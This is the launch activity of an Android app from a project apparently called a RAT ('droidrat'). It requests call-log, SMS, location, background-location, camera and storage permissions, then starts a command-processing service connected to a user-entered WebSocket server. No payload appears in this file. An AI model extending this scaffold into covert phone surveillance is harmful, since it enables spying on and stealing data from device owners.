package com.je_chen.droidrat_je.activity;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;

import androidx.appcompat.app.AppCompatActivity;

import com.je_chen.droidrat_je.R;
import com.je_chen.droidrat_je.modules.appsinfo.checkpermission.PermissionsCheck;
import com.je_chen.droidrat_je.service.command.ProcessCommandService;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class LaunchActivity extends AppCompatActivity implements View.OnClickListener {

    final String TAG = "JE-TAG";

    PackageManager packageManager;

    PermissionsCheck permissionsCheck;

    Button connectButton;

    EditText webSocketServerText;

    ImageView imageView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lanuch);

        packageManager = getPackageManager();
        permissionsCheck = new PermissionsCheck(packageManager);

        List<String> requestPermission = new ArrayList<>(Arrays.asList(
                // PHONE
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,

                // LOCATION
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,

                //SMS
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_SMS,

                //震動
                Manifest.permission.VIBRATE,

                //網路
                Manifest.permission.INTERNET,

                //檔案
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,

                //照片
                Manifest.permission.CAMERA
        ));

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            requestPermission.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            requestPermission.add(Manifest.permission.FOREGROUND_SERVICE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            permissionsCheck.checkPermission(this, requestPermission.toArray(new String[0]));
        }
        connectButton = findViewById(R.id.connectButton);
        connectButton.setOnClickListener(this);

        webSocketServerText = findViewById(R.id.webSocketServerText);

        imageView = findViewById(R.id.imageView);

    }

    @SuppressLint("NonConstantResourceId")
    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.connectButton:
                Intent startBackgroundService = new Intent(this, ProcessCommandService.class);
                startBackgroundService.putExtra("URI", webSocketServerText.getText().toString());
                startService(startBackgroundService);
                break;
        }
    }
}
